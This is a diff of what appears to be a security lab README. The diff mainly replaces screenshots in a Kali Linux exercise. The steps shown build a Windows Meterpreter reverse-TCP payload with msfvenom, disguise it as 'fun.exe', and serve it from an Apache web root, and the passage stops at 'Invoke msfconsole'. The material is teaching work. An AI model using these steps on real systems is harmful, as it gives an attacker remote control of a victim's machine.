@@ -22,12 +22,12 @@ Investigate on the various categories of tools as follows:
 Open terminal and try execute some kali linux commands
 
 ## EXECUTION STEPS AND ITS OUTPUT:
+![Uploading image.png…]()
 
 Find the attackers ip address using ifconfig
 ## OUTPUT:
 
-
-<img width="712" height="270" alt="image" src="https://github.com/user-attachments/assets/03919afe-ada8-4a52-9bc4-1afab301516c" />
+<img width="987" height="157" alt="image" src="https://github.com/user-attachments/assets/dd1e41e5-b0a2-4c42-b371-caf08aad519c" />
 
 
 Create a malicious executable file fun.exe using msfvenom command
@@ -35,23 +35,25 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
 
 
-<img width="793" height="122" alt="image" src="https://github.com/user-attachments/assets/4b787863-3239-47fe-9437-f3ecf0966e79" />
+<img width="492" height="81" alt="image" src="https://github.com/user-attachments/assets/2fc45d52-0389-432e-a75b-0c74084927ac" />
+
 
 copy the fun.exe into the apache /var/www/html folder
 ## OUTPUT:
 
-<img width="397" height="65" alt="image" src="https://github.com/user-attachments/assets/6fd6d168-b3af-40ec-8148-abd0024081e9" />
+<img width="551" height="80" alt="image" src="https://github.com/user-attachments/assets/f8c9182d-d9fe-4e1e-a959-39e5adac08f9" />
 
 Start apache server
 sudo systemctl apache2 start
 ## OUTPUT:
 
-<img width="442" height="62" alt="image" src="https://github.com/user-attachments/assets/f5e9d775-bcc6-4718-a273-c0d9ceb15762" />
+<img width="1056" height="377" alt="image" src="https://github.com/user-attachments/assets/3156a032-52c3-4b8e-af5f-4ef1b8c5888f" />
+
 
 Check the status of apache2
 ## OUTPUT:
 
-<img width="887" height="316" alt="image" src="https://github.com/user-attachments/assets/d85ba0a1-fc24-4d61-8959-efd6f3c8ba3e" />
+<img width="1010" height="582" alt="image" src="https://github.com/user-attachments/assets/801cd611-c66d-4e76-bcac-2c7604866b8a" />
 
 
 Invoke msfconsole:
